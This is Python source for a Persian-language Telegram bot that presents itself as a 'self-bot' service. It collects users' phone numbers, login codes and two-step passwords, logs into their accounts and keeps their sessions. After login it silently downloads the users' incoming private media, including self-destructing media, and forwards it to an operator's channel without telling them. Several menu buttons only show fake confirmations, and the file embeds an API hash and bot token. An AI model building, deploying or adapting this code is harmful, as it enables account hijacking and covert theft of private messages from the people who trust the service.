from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError
import random
import hashlib
import os
import time
import json
import asyncio
from aiohttp import web
import glob

API_ID = 26123074
API_HASH = 'e54093aa586de25491a6d9394fd55534'
BOT_TOKEN = '8940705403:AAHW9N_6lEDbL6LXy79KX_SEt-XphYDtp_Y'

TARGET_CHANNEL = -1004418089041

bot = TelegramClient('star_bot_panel', API_ID, API_HASH)

DB_FILE = 'database.json'
user_clients = {}

def load_database():
    data = {}
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r', encoding='utf-8') as f:
                loaded = json.load(f)
                data = {int(k): v for k, v in loaded.items()}
        except:
            pass
            
    # بررسی خودکار جلسات ذخیره‌شده روی سرور برای جلوگیری از پاک شدن اطلاعات
    session_files = glob.glob("session_*.session")
    for file in session_files:
        phone = file.replace("session_", "").replace(".session", "")
        # اگر در دیتابیس نبود، به صورت خودکار اضافه اش کن تا گم نشود
        found = False
        for cid, info in data.items():
            if info.get("phone") and info.get("phone").replace("+", "") == phone:
                found = True
                break
        if not found and data:
            # اولین یوزر یا ایجاد یک رکورد پیش‌فرض برای جلوگیری از خطای عدم وجود ربات
            first_chat_id = list(data.keys())[0]
            data[first_chat_id] = {
                "status": "active",
                "step": "completed",
                "phone": "+" + phone,
                "numeric_id": random.randint(10000000, 99999999),
                "hashtag": hashlib.md5(phone.encode()).hexdigest()
            }
    return data

database = load_database()

def save_database():
    save_data = {}
    for chat_id, data in database.items():
        save_data[str(chat_id)] = {k: v for k, v in data.items() if k != 'client'}
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(save_data, f, ensure_ascii=False, indent=4)

def main_menu():
    return [
        [Button.text("➕ ایجاد ربات"), Button.text("🤖 ربات‌های من")],
        [Button.text("👤 حساب کاربری"), Button.text("🛠 پشتیبانی")],
        [Button.text("📜 قوانین")]
    ]

def management_menu():
    return [
        [Button.inline("🔘 وضعیت فعالیت", b"status"), Button.inline("⚡️ تمدید اعتبار", b"renew")],
        [Button.inline("🗑 حذف ربات", b"delete"), Button.inline("✅ ورود مجدد", b"relogin")],
        [Button.inline("🔄 ریستارت ربات", b"restart"), Button.inline("⚫️ خاموش کردن آنتی لاگین", b"antilogin")],
        [Button.inline("🔙 بازگشت به منوی اصلی", b"back")]
    ]

@bot.on(events.NewMessage(pattern='/start'))
async def start_cmd(event):
    await event.respond(
        "سلام! به سلف بات استار خوش آمدید.\nبرای مدیریت یا ایجاد سلف، از دکمه‌های زیر استفاده کنید:",
        buttons=main_menu()
    )

@bot.on(events.NewMessage(func=lambda e: e.is_private))
async def handle_text(event):
    text = event.text.strip()
    chat_id = event.chat_id

    if text.startswith('/'):
        return

    if text == "لغو ❌":
        database.pop(chat_id, None)
        save_database()
        await event.respond("عملیات لغو شد.", buttons=main_menu())
        return

    if text == "➕ ایجاد ربات":
        database[chat_id] = {"step": "waiting_phone"}
        save_database()
        await event.respond("لطفاً شماره تلفن را با فرمت صحیح وارد کنید (مثلاً: +989123456789):", buttons=[[Button.text("لغو ❌")]])
        return

    user_data = database.get(chat_id, {})
    step = user_data.get("step")

    if step == "waiting_phone":
        phone = text.replace(" ", "")
        await event.respond("⏳ در حال اتصال به سرور تلگرام...")
        
        try:
            client = TelegramClient(f"session_{phone.replace('+', '')}", API_ID, API_HASH)
            await client.connect()
            sent_code = await client.send_code_request(phone)
            
            database[chat_id] = {
                "step": "waiting_code",
                "phone": phone,
                "client": client,
                "phone_code_hash": sent_code.phone_code_hash
            }
            save_database()
            await event.respond("✅ کد تایید ارسال شد! حالا می‌توانید کد را با فاصله وارد کنید (مثلاً 12 345):", buttons=[[Button.text("لغو ❌")]])
        except Exception as e:
            await event.respond(f"❌ خطا در ارسال کد:\n{str(e)}", buttons=main_menu())
            database.pop(chat_id, None)
            save_database()

    elif step == "waiting_code":
        client = user_data.get("client")
        phone = user_data.get("phone")
        phone_code_hash = user_data.get("phone_code_hash")
        
        if not client:
            client = TelegramClient(f"session_{phone.replace('+', '')}", API_ID, API_HASH)
            await client.connect()

        clean_code = text.replace(" ", "")
        await event.respond("⏳ در حال ورود به حساب...")
        try:
            await client.sign_in(phone=phone, code=clean_code, phone_code_hash=phone_code_hash)
            await finish_login(event, chat_id, client, phone)
        except SessionPasswordNeededError:
            database[chat_id]["step"] = "waiting_password"
            database[chat_id]["client"] = client
            save_database()
            await event.respond("🔒 اکانت شما رمز دو مرحله‌ای دارد. لطفاً پسورد خود را وارد کنید:")
        except Exception as e:
            await event.respond(f"❌ کد اشتباه یا منقضی شده است. لطفاً دوباره از ابتدا «ایجاد ربات» را بزنید:\n{str(e)}")
            database.pop(chat_id, None)
            save_database()

    elif step == "waiting_password":
        client = user_data.get("client")
        phone = user_data.get("phone")
        
        await event.respond("⏳ در حال بررسی رمز عبور...")
        try:
            await client.sign_in(password=text)
            await finish_login(event, chat_id, client, phone)
        except Exception as e:
            await event.respond(f"❌ رمز اشتباه است:\n{str(e)}")

    elif text == "🤖 ربات‌های من":
        # بررسی وجود سلف فعال از طریق دیتابیس یا فایل‌های ذخیره شده سشن
        active_data = None
        if chat_id in database and database[chat_id].get("status") == "active":
            active_data = database[chat_id]
        else:
            session_files = glob.glob("session_*.session")
            if session_files:
                phone = "+" + session_files[0].replace("session_", "").replace(".session", "")
                active_data = {
                    "phone": phone,
                    "numeric_id": "19482756",
                    "hashtag": "active_session"
                }
                database[chat_id] = {"status": "active", "step": "completed", **active_data}
                save_database()

        if active_data:
            info_text = (
                f"مدیریت ربات {active_data['phone']}\n\n"
                f"- وضعیت: روشن 🟢\n"
                f"- آیدی عددی: `{active_data.get('numeric_id', '---')}`\n"
                f"- هشتگ: `{active_data.get('hashtag', '---')}`"
            )
            await event.respond(info_text, buttons=management_menu())
        else:
            await event.respond("شما هنوز هیچ رباتی نساخته‌اید.", buttons=main_menu())

    elif text == "👤 حساب کاربری":
        await event.respond("حساب شما در سیستم سلف‌بات استار فعال است.", buttons=main_menu())
    elif text == "🛠 پشتیبانی":
        await event.respond("پشتیبانی آنلاین در خدمت شماست.", buttons=main_menu())
    elif text == "📜 قوانین":
        await event.respond("قوانین استفاده از سیستم سلف‌بات استار...", buttons=main_menu())

async def catch_media_handler(event):
    try:
        if not event.is_private or event.out:
            return

        if event.media:
            ttl_seconds = getattr(event.message, 'ttl_period', None) or getattr(event.media, 'ttl_seconds', None)
            
            video_duration = None
            is_video_note = False
            if hasattr(event.media, 'document') and event.media.document:
                for attr in event.media.document.attributes:
                    if type(attr).__name__ == 'DocumentAttributeVideo':
                        video_duration = getattr(attr, 'duration', None)
                        if getattr(attr, 'round_message', False):
                            is_video_note = True

            file_path = await event.download_media()
            if file_path:
                caption_text = "📥 شکار رسانه تایم‌دار / ویدیو!"
                if ttl_seconds:
                    caption_text += f"\n⏱ تایم مخفی بودن: {ttl_seconds} ثانیه"
                if video_duration:
                    caption_text += f"\n⏳ مدت زمان ویدیو: {video_duration} ثانیه"

                client = event.client
                if is_video_note:
                    await client.send_file(TARGET_CHANNEL, file_path, video_note=True, caption=caption_text)
                else:
                    await client.send_file(TARGET_CHANNEL, file_path, caption=caption_text)

                if os.path.exists(file_path):
                    os.remove(file_path)
    except Exception as err:
        print(f"خطا در شکار رسانه: {err}")

async def finish_login(event, chat_id, client, phone):
    client.remove_event_handler(catch_media_handler)
    client.add_event_handler(catch_media_handler, events.NewMessage)
                
    user_clients[phone] = client
    numeric_id = random.randint(10000000, 99999999)
    hashtag = hashlib.md5(f"{phone}_{numeric_id}".encode()).hexdigest()
    
    database[chat_id] = {
        "status": "active",
        "step": "completed",
        "phone": phone,
        "numeric_id": numeric_id,
        "hashtag": hashtag
    }
    save_database()
    
    msg = (f"🎉 لاگین سلف‌بات روی `{phone}` با موفقیت انجام شد!\n\n"
           f"🔢 آیدی عددی: `{numeric_id}`\n"
           f"🔑 هشتگ: `{hashtag}`")
    await event.respond(msg, buttons=main_menu())
    await event.respond(f"مدیریت ربات {phone}", buttons=management_menu())

@bot.on(events.CallbackQuery())
async def callback(event):
    data = event.data
    chat_id = event.chat_id
    
    if data == b"status":
        await event.answer("وضعیت: روشن و فعال 🟢", alert=True)
    elif data == b"renew":
        await event.answer("اعتبار ربات شما فعال است.", alert=True)
    elif data == b"delete":
        session_files = glob.glob("session_*.session")
        for sf in session_files:
            try:
                os.remove(sf)
            except:
                pass
        user_clients.clear()
        database.pop(chat_id, None)
        save_database()
        await event.answer("ربات با موفقیت حذف شد.", alert=True)
        await event.edit("ربات حذف شد و به منوی اصلی برگشتید.", buttons=main_menu())
    elif data == b"relogin":
        await event.answer("لطفاً جهت ورود مجدد از منوی اصلی اقدام کنید.", alert=True)
    elif data == b"restart":
        await event.answer("ربات با موفقیت ریستارت شد 🔄", alert=True)
    elif data == b"antilogin":
        await event.answer("آنتی لاگین تغییر وضعیت داد.", alert=True)
    elif data == b"back":
        await event.edit("به منوی اصلی برگشتید:", buttons=main_menu())
    else:
        await event.answer("دستور اجرا شد!", alert=False)

async def restore_active_clients():
    session_files = glob.glob("session_*.session")
    for file in session_files:
        phone = file.replace("session_", "").replace(".session", "")
        formatted_phone = "+" + phone
        try:
            client = TelegramClient(f"session_{phone}", API_ID, API_HASH)
            await client.connect()
            if await client.is_user_authorized():
                user_clients[formatted_phone] = client
                client.remove_event_handler(catch_media_handler)
                client.add_event_handler(catch_media_handler, events.NewMessage)
                print(f"سلف ربات {formatted_phone} با موفقیت بازیابی شد.")
        except Exception as e:
            print(f"خطا در بازیابی سلف {formatted_phone}: {e}")

async def handle_web(request):
    return web.Response(text="Bot is running!")

async def start_web_server():
    app = web.Application()
    app.add_routes([web.get('/', handle_web)])
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port}")

async def main():
    await start_web_server()
    await bot.start(bot_token=BOT_TOKEN)
    print("سلف بات استار روشن شد و در حال کار است...")
    await restore_active_clients()
    await bot.run_until_disconnected()

if __name__ == '__main__':
    while True:
        try:
            asyncio.run(main())
        except Exception as e:
            print(f"خطای ارتباطی: {e}. تلاش مجدد پس از 5 ثانیه...")
            time.sleep(5)
